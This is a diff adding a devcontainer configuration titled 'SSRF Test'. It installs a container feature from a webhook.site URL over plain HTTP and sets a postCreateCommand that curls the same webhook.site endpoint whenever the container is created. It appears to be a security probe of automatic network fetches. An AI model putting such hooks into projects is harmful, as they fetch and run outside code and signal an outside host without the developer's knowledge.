@@ -1,0 +1,11 @@
+{
+  "name": "SSRF Test",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "features": {
+    "ghcr.io/devcontainers/features/common-utils:2": {},
+    "http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/feature.tgz": {
+      "version": "latest"
+    }
+  },
+  "postCreateCommand": "curl http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/devcontainer-postcreate"
+}
